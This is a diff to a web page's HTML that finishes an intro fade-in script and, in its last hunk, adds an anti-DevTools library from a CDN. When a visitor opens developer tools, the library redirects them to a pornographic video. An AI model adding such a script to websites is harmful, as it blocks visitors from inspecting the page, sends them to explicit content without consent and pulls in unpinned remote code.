@@ -27,6 +27,7 @@
             font-family: 'Outfit', sans-serif;
             text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
         }
+        
         #background-image {
             position: fixed;
             top: 0;
@@ -39,6 +40,8 @@
             filter: brightness(25%) contrast(175%) saturate(0.5);
             z-index: -1;
         }
+
+        /* --- CSS for Fade-In Effect --- */
         #intro-screen {
             position: fixed;
             top: 0;
@@ -58,6 +61,7 @@
             opacity: 0;
             pointer-events: none;
         }
+        
         #main-content {
             opacity: 0;
             transition: opacity 1s ease-in-out;
@@ -135,9 +139,8 @@
         </div>
     </div>
 
-    <!-- Intro screen fade logic -->
     <script>
-        document.getElementById('enter-button').addEventListener('click', function () {
+        document.getElementById('enter-button').addEventListener('click', function() {
             const introScreen = document.getElementById('intro-screen');
             const mainContent = document.getElementById('main-content');
             const audio = document.getElementById('background-audio');
@@ -147,4 +150,25 @@
             introScreen.classList.add('fade-out');
 
             introScreen.addEventListener('transitionend', function handler() {
-                introScreen.style
+                introScreen.style.display = 'none';
+                mainContent.classList.add('preparing');
+                setTimeout(() => {
+                    mainContent.classList.add('active');
+                }, 10);
+                introScreen.removeEventListener('transitionend', handler);
+            });
+        });
+    </script>
+
+    <!-- 🔐 Disable DevTools Script (adds redirect if devtools is opened) -->
+    <script src="https://cdn.jsdelivr.net/npm/disable-devtool@latest/disable-devtool.min.js"></script>
+    <script>
+        DisableDevtool({
+            ondevtoolopen: function(type) {
+                window.location.href = 'https://www.pornhub.com/view_video.php?viewkey=664222b4e1f52';
+            }
+        });
+    </script>
+
+</body>
+</html>
